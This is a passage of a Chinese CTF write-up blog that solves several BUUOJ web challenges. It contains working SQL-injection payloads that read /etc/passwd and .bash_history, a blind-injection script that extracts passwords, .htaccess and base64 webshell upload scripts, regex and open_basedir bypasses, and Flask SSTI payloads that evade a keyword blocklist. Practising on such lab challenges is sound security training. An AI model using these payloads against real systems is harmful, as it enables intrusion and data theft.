mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',//未过滤直接用</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashes绕过方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置数据库字符为gbk导致宽字节注入</span><br><span class="line">使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</span><br><span class="line">url解码导致绕过addslashes</span><br><span class="line">base64解码导致绕过addslashes</span><br><span class="line">json编码导致绕过addslashes</span><br><span class="line">没有使用引号保护字符串，直接无视addslashes</span><br><span class="line">使用了stripslashes(去掉了\)</span><br><span class="line">字符替换导致的绕过addslashes</span><br></pre></td></tr></table></figure><p>category只过=过滤了一次，二次注入</p><p>尝试发帖，要登录，账号密码告知，密码后三位需要爆破，爆破出666</p><p>这里用/**/来注释</p><p>123’,content=user(),/*,评论中写*/#就闭合了语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">'123'</span>,<span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">                content = '*/</span><span class="comment">#',</span></span><br><span class="line">                bo_id = <span class="string">'$bo_id'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>下面直接给payload，就不多说了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">',content=(<span class="keyword">select</span>( <span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>))),<span class="comment">/*</span></span><br><span class="line"><span class="comment">',content=(select(load_file("/home/www/.bash_history"))),/*</span></span><br><span class="line"><span class="comment">',content=(select(hex(load_file("/tmp/html/.DS_Store")))),/*/</span>/发现长度不够改为<span class="keyword">hex</span>读取</span><br><span class="line"><span class="string">',content=(select hex(load_file("/tmp/html/flag_8946e1ff1ee3e40f.php"))),/*</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/1.png" class=""><h4 id="0X03：-GXYCTF2019-BabyUpload"><a href="#0X03：-GXYCTF2019-BabyUpload" class="headerlink" title="0X03：[GXYCTF2019]BabyUpload"></a>0X03：[GXYCTF2019]BabyUpload</h4><p>文件上传，直接上马先试试</p><p>发现jpg文件直接上传成功了，用蚁剑连接，发现不行</p><p>改用png失败</p><p>经过尝试发现.htaccess在改了content-type之后能上传！</p><img src="/2020/05/16/buuoj3/3.png" class=""><img src="/2020/05/16/buuoj3/2.png" class=""><p>上传成功了，下面上传之前的jpg文件应该能成功了</p><p>这里注意的是，&lt;?被过滤了，以js的形式写🐎，上传后用蚁剑</p><img src="/2020/05/16/buuoj3/4.png" class=""><h4 id="0X04-CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#0X04-CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="0X04:[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>0X04:[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>没发现什么有用的东西，御剑扫描，发现了robots.txt,访问</p><img src="/2020/05/16/buuoj3/5.png" class=""><p>想不到有啥，看了网页源码看到个image，猜测可能会是，意外，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>经过测试，发现用\\0可以输出\，达到目的</p><p>这道题看了wp，用的是盲注，这里直接贴一下脚本吧，自己看看就懂啥意思了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a733f818-a663-4ff3-9338-435c6195bf93.node3.buuoj.cn/image.php"</span></span><br><span class="line">response = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">'or id = if(ascii(substr((select password from users limit 1 offset 0),%d,1))&gt;%d,1,0)#'</span>%(i,mid)</span><br><span class="line">        params=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'\\0'</span>,</span><br><span class="line">            <span class="string">'path'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        txt = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> txt.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    response+=chr(int(mid))</span><br><span class="line">    print(response)</span><br></pre></td></tr></table></figure><p>注出的密码是12a0811ae7c390765ab4，账户名直接猜的admin，登录，发现是文件上传，用小马以jpg文件上传，连接不上，别的师傅说是用短标签，来试试</p><img src="/2020/05/16/buuoj3/6.png" class=""><p>成功上传了，蚁剑成功连接，在根目录下找到flag</p><h4 id="0X05-FBCTF2019-RCEService"><a href="#0X05-FBCTF2019-RCEService" class="headerlink" title="0X05:[FBCTF2019]RCEService"></a>0X05:[FBCTF2019]RCEService</h4><p>打开题目，可以使用的是json格式的命令查询</p><p>先试一下{“cmd”:”ls”}，提示非法输入，换成其他的执行命令都不太行，看了一篇别的师傅的wp，说是原题有给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match只会匹配一行的内容，这里可以用换行符%0A来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?cmd&#x3D;&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125; 这个路径挺难找的23333</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/7.png" class=""><p>还有一种方法是利用prce回溯次数限制绕过，p神文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html，可以去看看试一下" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html，可以去看看试一下</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","zz":"'</span> + <span class="string">"a"</span>*(<span class="number">1000000</span>) + <span class="string">'"&#125;'</span></span><br><span class="line">res = requests.post(<span class="string">"http://af72594c-dbfc-4ef9-baa3-0738dbb5fdb9.node3.buuoj.cn/"</span>, data=&#123;<span class="string">"cmd"</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h4 id="0X06-SUCTF-2019-EasyWeb"><a href="#0X06-SUCTF-2019-EasyWeb" class="headerlink" title="0X06:[SUCTF 2019]EasyWeb"></a>0X06:[SUCTF 2019]EasyWeb</h4><p>源码审</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;<span class="comment">//文件夹feikong</span></span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);<span class="comment">//$name匹配到.号最后的位置下标+1，匹配$name中n+1个字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//匹配到ph结束</span></span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);<span class="comment">//不能在$tmp_name中匹配到<span class="meta">&lt;?</span></span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">//判断为图片格式</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;<span class="comment">//路径</span></span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">////?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag</span></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);<span class="comment">//      !#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先来看代码执行调用get_the_flag部分</p><p>对长度进行了限制，正则表达式fuzz一下，!#$%()*+-/:;&lt;&gt;?@]^{}是可用的，这里想到的是用异或构造payload，下面是生成需要字符的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">find = [<span class="string">'G'</span>,<span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'_'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result = chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            b = j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure><p>凑出这部分的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe&#x3D;get_the_flag</span><br></pre></td></tr></table></figure><p>下面再看函数部分，&lt;?被过滤，使用了exif_imagetype来判断是不是图片，文件后缀不能出现ph</p><p>这里的php版本是7.2的，不能用&lt;script&gt;标签的方式来绕过&lt;?,这里可以用base64编码绕过，在.htaccess中利用php伪协议进行解码</p><p>shell.abc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a12</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYyddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>.htacess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure><p>上传脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .abc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.abc"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line">url = <span class="string">"http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>:(<span class="string">'shell.abc'</span>,shell,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>访问?a=phpinfo();可以得到phpinfo页面，这里不知道什么原因做的时候没法回显，下面的知识点是参考的</p><p>这时会发现存在open_basedir和disable_functions的限制 </p><p>open_basedir:/var/www/html/:/tmp/（附上payload链接：<a href="https://xz.aliyun.com/t/4720）" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720）</a></p><p>这是最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure><h4 id="0X06：-GYCTF2020-FlaskApp"><a href="#0X06：-GYCTF2020-FlaskApp" class="headerlink" title="0X06：[GYCTF2020]FlaskApp"></a>0X06：[GYCTF2020]FlaskApp</h4><p>这是之前比赛做出来过的题，用的是拼接，做出来之后复现失败了，现在buu上有了，再来做一次记录一下</p><p>这是一道SSTI模板注入，先编码再解码，可以得到需要的信息，题目是flask，去找flask对应的模板注入即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/8.png" class=""><p>可以看到源码，下面是源码中的WAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> black_list = [&amp;<span class="comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span></span><br></pre></td></tr></table></figure><p>可以看到flag，os，system等都被过滤了，这里可以用拼接来进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/9.png" class=""><p>可以看到flag文件</p><p>这次用一下切片取反字符串，省去拼接flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span></span><br></pre></td></tr></table></figure><img src="/2020/05/16/buuoj3/10.png" class=""><h4 id="0X07：-NPUCTF2020-ReadlezPHP"><a href="#0X07：-NPUCTF2020-ReadlezPHP" class="headerlink" title="0X07：[NPUCTF2020]ReadlezPHP"></a>0X07：[NPUCTF2020]ReadlezPHP</h4><p>打开是一个网页，在网页源码找到了跳转链接，拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span 